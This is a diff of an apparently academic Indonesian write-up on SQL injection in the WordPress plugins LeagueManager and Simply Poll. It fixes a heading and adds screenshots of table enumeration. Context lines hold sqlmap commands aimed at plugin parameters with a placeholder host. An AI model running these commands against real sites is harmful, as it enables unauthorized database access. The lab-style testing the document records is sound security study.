@@ -24,7 +24,7 @@ Merupakan Plugin yang digunakan untuk menambahkan video pada Wordpress website. 
 #### 2. LeagueManager 3.9.1.1
 Merupakan plugin yang digunakan untuk mengatur dan menampilkan hasil dari pertandingan olahraga pada Wordpress website. Plugin ini dapat diunduh pada https://wordpress.org/plugins/leaguemanager/
 
-#### 3. Simply Polls 1.4.1
+#### 3. Simply Poll 1.4.1
 Merupakan plugin yang digunakan untuk membuat poll pada Wordpress website. Poll yang dibuat dapat ditampilkan pada sidebar, post, maupun pages dari website. Plugin ini dapat diunduh pada https://wordpress.org/plugins/simply-polls/
 
 ### Tools yang Digunakan
@@ -134,6 +134,13 @@ python sqlmap -u "http://alamat_site/wp-admin/admin-ajax.php"  --data="action=sp
 python sqlmap.py --url "http://alamat_site?match=1" --level 5 --risk 3 --dbms mysql --tables
 </pre>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hasil:
+
+![leaguemanager 1](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables1.png)
+![leaguemanager 2](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables2.png)
+![leaguemanager 3](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables3.png)
+![leaguemanager 4](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables4.png)
+![leaguemanager 5](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables5.png)
+![leaguemanager 6](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%202/screenshot/leaguemanager_tables6.png)
 
 - atau:<pre>
 python sqlmap.py --url "http://alamat_site?league_id=1&season=Winter" --level 5 --risk 3 --dbms mysql --tables
